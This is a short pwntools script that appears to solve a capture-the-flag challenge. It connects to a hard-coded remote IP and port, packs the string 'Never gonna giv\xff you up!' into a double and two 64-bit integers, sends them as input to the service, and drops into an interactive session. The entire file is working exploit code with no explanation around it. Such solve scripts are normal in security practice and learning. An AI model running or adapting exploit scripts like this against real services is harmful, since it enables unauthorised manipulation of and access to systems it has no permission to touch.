import struct

import pwn as p

io = p.remote("109.233.56.90", 11571)

aim = b"Never gonna giv\xff you up!"

c0, c1, c2 = aim[0:8], aim[8:16], aim[16:24]

payload = str(struct.unpack('<d', c0)[0]).encode()
payload += b' '

payload += str(p.unpack(c1, 64, sign=True)).encode()
payload += b' '

payload += str(p.unpack(c2, 64, sign=False)).encode()
payload += b' '


io.sendline(payload)
io.interactive()
